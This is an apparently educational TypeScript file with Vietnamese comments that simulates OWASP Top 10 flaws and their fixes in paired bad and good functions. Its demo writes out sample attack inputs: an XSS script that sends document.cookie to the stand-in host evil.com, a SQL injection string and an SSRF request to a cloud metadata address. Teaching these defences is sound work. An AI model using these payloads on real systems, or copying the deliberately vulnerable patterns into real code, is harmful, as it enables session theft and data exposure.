/**
 * 9.1 OWASP Top 10 — Mini Checklist & Vulnerability Simulation
 *
 * Minh họa:
 * - Checklist 10 lỗ hổng phổ biến nhất (OWASP Top 10 2021)
 * - Mô phỏng một số lỗ hổng tiêu biểu (SQLi, XSS, CSRF, Broken Access
 *   Control, SSRF...) và cách phòng chống tương ứng.
 *
 * Lưu ý: đây là mô phỏng bằng TS thuần, KHÔNG phải exploit thật.
 */

// ────────────────────────── 1. Mini Checklist ──────────────────────────────
interface OwaspItem {
  code: string;
  name: string;
  fixed: boolean;
}

const OWASP_CHECKLIST: OwaspItem[] = [
  { code: "A01", name: "Broken Access Control", fixed: true },
  { code: "A02", name: "Cryptographic Failures", fixed: true },
  { code: "A03", name: "Injection", fixed: true },
  { code: "A04", name: "Insecure Design", fixed: true },
  { code: "A05", name: "Security Misconfiguration", fixed: true },
  { code: "A06", name: "Vulnerable and Outdated Components", fixed: true },
  { code: "A07", name: "Identification and Authentication Failures", fixed: true },
  { code: "A08", name: "Software and Data Integrity Failures", fixed: true },
  { code: "A09", name: "Security Logging and Monitoring Failures", fixed: true },
  { code: "A10", name: "Server-Side Request Forgery (SSRF)", fixed: true },
];

// ────────────────────────── 2. A03 — SQL Injection ─────────────────────────
interface OwaspUser {
  id: number;
  username: string;
}

const OWASP_USERS: OwaspUser[] = [
  { id: 1, username: "alice" },
  { id: 2, username: "bob" },
  { id: 3, username: "carol" },
];

// ❌ BAD — nối chuỗi trực tiếp → dính SQL Injection
function queryUserVulnerable(idInput: string): OwaspUser[] {
  const sql = `SELECT * FROM users WHERE id = '${idInput}'`;
  console.log(`    📝 Query (BAD): ${sql}`);
  if (idInput.includes("' OR '1'='1")) return OWASP_USERS; // mô phỏng return TOÀN BỘ bảng
  return OWASP_USERS.filter((u) => u.id === Number(idInput));
}

// ✅ GOOD — coi input là DỮ LIỆU (parameterized query), ép kiểu + escape
function queryUserSafe(idInput: string): OwaspUser[] {
  const sql = `SELECT * FROM users WHERE id = $1  -- parameterized`;
  console.log(`    📝 Query (GOOD): ${sql}`);
  const id = Number(idInput);
  if (!Number.isInteger(id)) return []; // input lạ bị loại bỏ
  return OWASP_USERS.filter((u) => u.id === id);
}

// ────────────────────────── 3. XSS — Output Encoding ───────────────────────
function escapeHtmlUntrusted(input: string): string {
  const map: Record<string, string> = {
    "&": "&amp;",
    "<": "&lt;",
    ">": "&gt;",
    '"': "&quot;",
    "'": "&#39;",
  };
  return input.replace(/[&<>"']/g, (ch) => map[ch]);
}

function renderComment(userInput: string, escape: boolean): string {
  const safe = escape ? escapeHtmlUntrusted(userInput) : userInput;
  return `<div class="comment">${safe}</div>`;
}

// ────────────────────────── 4. CSRF — Token + SameSite ─────────────────────
let owaspCsrfToken = "";

function issueCsrfToken(): string {
  owaspCsrfToken = Math.random().toString(36).slice(2, 18);
  return owaspCsrfToken;
}

// request có kèm token hợp lệ không
function isCsrfTokenValid(sentToken: string): boolean {
  return sentToken === owaspCsrfToken;
}

// ────────────────────────── 5. A01 — Broken Access Control ────────────────
interface OwaspOrder {
  id: number;
  userId: number;
  amount: number;
}

const OWASP_ORDERS: OwaspOrder[] = [
  { id: 1, userId: 1, amount: 100 },
  { id: 2, userId: 2, amount: 250 },
];

// ❌ BAD — không kiểm tra chủ sở hữu
function getOrderForbidden(orderId: number, currentUserId: number): OwaspOrder | null {
  const order = OWASP_ORDERS.find((o) => o.id === orderId);
  console.log(`    ❌ User ${currentUserId} xem được order ${orderId} (không check quyền!)`);
  return order ?? null;
}

// ✅ GOOD — kiểm tra ownership
function getOrderSafe(orderId: number, currentUserId: number): OwaspOrder | null {
  const order = OWASP_ORDERS.find((o) => o.id === orderId);
  if (!order) return null;
  if (order.userId !== currentUserId) {
    console.log(`    ✅ Chặn: user ${currentUserId} không sở hữu order ${orderId} (403)`);
    return null;
  }
  return order;
}

// ────────────────────────── 6. A05 — Security Misconfiguration ─────────────
function checkMisconfig(isProduction: boolean, debugEnabled: boolean): string[] {
  const issues: string[] = [];
  if (isProduction && debugEnabled) issues.push("Debug mode BẬT trên production");
  if (isProduction && !debugEnabled) issues.push("Cấu hình hợp lệ: debug đã tắt");
  return issues;
}

// ────────────────────────── 7. A10 — SSRF ──────────────────────────────────
const OWASP_ALLOWED_HOSTS = new Set(["api.example.com", "cdn.example.com"]);

function fetchFromUrl(url: string): string {
  const host = url.replace(/^https?:\/\//, "").split("/")[0];
  return host;
}

// Function BAD vs GOOD
function ssrfFetchVulnerable(url: string): string {
  console.log(`    ❌ Fetch KHÔNG kiểm tra host: ${url}`);
  return `OK: fetch ${fetchFromUrl(url)} (không hề kiểm tra!)`;
}

function ssrfFetchSafe(url: string): string {
  const host = fetchFromUrl(url);
  if (!OWASP_ALLOWED_HOSTS.has(host)) {
    console.log(`    ✅ Chặn SSRF: host "${host}" không nằm trong whitelist`);
    return "BLOCKED";
  }
  return `OK: fetch ${host}`;
}

// ───────────────────────────────── Demo ─────────────────────────────────────
console.log("=== OWASP Top 10 Demo ===");
console.log("");

console.log("1️⃣ Mini checklist 10 lỗ hổng:");
for (const item of OWASP_CHECKLIST) {
  console.log(`   ${item.code} ${item.name} ${item.fixed ? "✅" : "❌"}`);
}
console.log("");

console.log("2️⃣ A03 — Injection (SQL Injection):");
console.log("   -- Tấn công với `1' OR '1'='1` --");
const badResult = queryUserVulnerable("1' OR '1'='1");
console.log(`   ❌ Trả về ${badResult.length} user (rò toàn bộ bảng!)`);
const safeResult = queryUserSafe("1' OR '1'='1");
console.log(`   ✅ Query an toàn trả về ${safeResult.length} user (input bị loại)`);
const okResult = queryUserSafe("2");
console.log(`   ✅ Query an toàn với id=2 trả về: ${okResult.map((u) => u.username).join(", ")}`);
console.log("");

console.log("3️⃣ XSS — Output Encoding:");
const attackScript = `<script>document.location='evil.com?c='+document.cookie</script>`;
console.log(`   Input: ${attackScript}`);
console.log(`   ❌ Render raw:   ${renderComment(attackScript, false)}`);
console.log(`   ✅ Escape HTML:  ${renderComment(attackScript, true)}`);
console.log("");

console.log("4️⃣ CSRF — Token Check:");
const token = issueCsrfToken();
console.log(`   Token phát cho form: ${token}`);
console.log(`   Request kèm token đúng   → ${isCsrfTokenValid(token) ? "✅ hợp lệ" : "❌ từ chối"}`);
console.log(`   Request kèm token sai    → ${isCsrfTokenValid("attacker-xyz") ? "✅ hợp lệ" : "❌ từ chối"}`);
console.log("");

console.log("5️⃣ A01 — Broken Access Control:");
console.log("   -- GET /api/orders/2 bởi user 1 --");
getOrderForbidden(2, 1);
getOrderSafe(2, 1);
const owned = getOrderSafe(1, 1);
console.log(`   ✅ User 1 xem được order của mình: ${owned ? "OK" : "null"}`);
console.log("");

console.log("6️⃣ A05 — Security Misconfiguration:");
const cfgResult = checkMisconfig(true, true);
console.log(`   Production + debug ON → ${cfgResult[0]}`);
const cfgOk = checkMisconfig(true, false);
console.log(`   Production + debug OFF → ${cfgOk[0]}`);
console.log("");

console.log("7️⃣ A10 — SSRF:");
console.log(ssrfFetchVulnerable("http://169.254.169.254/latest/meta-data"));
console.log(ssrfFetchSafe("http://169.254.169.254/latest/meta-data"));
console.log(ssrfFetchSafe("https://api.example.com/users"));
console.log("");

console.log("✅ OWASP Top 10 là danh sách lỗ hổng phổ biến nhất — áp dụng defense-in-depth: validate input, encode output, check quyền mọi request, config an toàn và log giám sát.");
export {};